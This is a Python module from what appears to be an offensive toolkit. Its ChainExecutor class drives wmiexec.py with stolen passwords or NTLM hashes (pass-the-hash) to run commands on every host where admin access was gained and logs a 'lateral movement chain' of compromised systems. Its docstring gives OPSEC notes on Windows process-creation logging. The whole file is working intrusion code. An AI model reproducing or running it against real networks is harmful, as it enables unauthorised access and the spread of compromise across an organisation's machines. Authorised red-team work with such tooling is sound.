"""
Chain Executor Operation
Executes commands across compromised systems building movement chain
"""

import sys
from pathlib import Path
from typing import List, Optional

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from ..core.models import (
    Credential,
    AccessEntry,
    AccessMatrix,
    MovementStep,
    MovementChain,
    CredentialType
)
from ..utils.output import output
from ..utils.executor import executor


class ChainExecutor:
    """
    Executes lateral movement chain

    Uses WMI to execute commands on systems where we have access.
    Builds a movement chain tracking all successful executions.

    Prioritizes admin access entries for execution.

    OPSEC Considerations:
        - WMI execution creates processes on target
        - Event ID 4688 logs process creation
        - Consider timing and command choices
        - Output is captured and logged
    """

    def __init__(self, timeout: int = 30):
        """
        Initialize chain executor

        Args:
            timeout: Timeout for each execution attempt
        """
        self.timeout = timeout

    def _build_wmi_command(self, target: str, credential: Credential,
                           command: str) -> str:
        """Build wmiexec command"""
        if credential.cred_type == CredentialType.HASH:
            return (
                f"wmiexec.py "
                f"{credential.domain}/{credential.username}@{target} "
                f"-hashes :{credential.ntlm_hash} "
                f"'{command}'"
            )
        else:
            return (
                f"wmiexec.py "
                f"{credential.domain}/{credential.username}:'{credential.password}'@{target} "
                f"'{command}'"
            )

    def execute_single(self, entry: AccessEntry, command: str) -> MovementStep:
        """
        Execute command on single target

        Args:
            entry: AccessEntry with target and credential
            command: Command to execute

        Returns:
            MovementStep with execution results
        """
        cmd = self._build_wmi_command(entry.target, entry.credential, command)
        result = executor.execute_silent(cmd, timeout=self.timeout)

        success = result.returncode == 0 and result.stdout.strip()

        return MovementStep(
            target=entry.target,
            credential=entry.credential,
            command=command,
            output=result.stdout if success else None,
            success=success,
            error=result.error if not success else None
        )

    def execute_chain(self, access_matrix: AccessMatrix,
                      command: str = "whoami",
                      admin_only: bool = True) -> MovementChain:
        """
        Execute command across all accessible systems

        Args:
            access_matrix: AccessMatrix with valid credentials
            command: Command to execute on each target
            admin_only: If True, only execute on admin-accessible systems

        Returns:
            MovementChain with all execution results
        """
        output.banner("LATERAL MOVEMENT CHAIN EXECUTION")

        if admin_only:
            entries = access_matrix.get_admin_access()
            output.info(f"Systems with admin access: {len(entries)}")
        else:
            entries = access_matrix.entries
            output.info(f"Total accessible systems: {len(entries)}")

        output.info(f"Command: {command}")

        chain = MovementChain()

        for entry in entries:
            output.newline()
            output.info(f"Executing on {entry.target} as {entry.credential}...")

            step = self.execute_single(entry, command)
            chain.add_step(step)

            if step.success:
                output.success("SUCCESS!")
                # Show truncated output
                if step.output:
                    preview = step.output[:200] + "..." if len(step.output) > 200 else step.output
                    output.info(f"Output: {preview}")
            else:
                output.failure("Execution failed")
                if step.error:
                    output.info(f"Error: {step.error}")

        output.newline()
        output.success(f"Successfully executed on {len(chain.compromised_hosts)} systems")

        return chain

    def execute_on_targets(self, targets: List[str], credential: Credential,
                           command: str = "whoami") -> MovementChain:
        """
        Execute command on specific targets with single credential

        Args:
            targets: List of targets to execute on
            credential: Credential to use
            command: Command to execute

        Returns:
            MovementChain with results
        """
        output.banner("TARGETED EXECUTION")
        output.info(f"Targets: {len(targets)}")
        output.info(f"Credential: {credential}")
        output.info(f"Command: {command}")

        chain = MovementChain()

        for target in targets:
            output.newline()
            output.info(f"Executing on {target}...")

            # Create temporary entry
            entry = AccessEntry(
                target=target,
                credential=credential,
                access_level=None  # Unknown
            )

            step = self.execute_single(entry, command)
            chain.add_step(step)

            if step.success:
                output.success("SUCCESS!")
            else:
                output.failure("Failed")

        return chain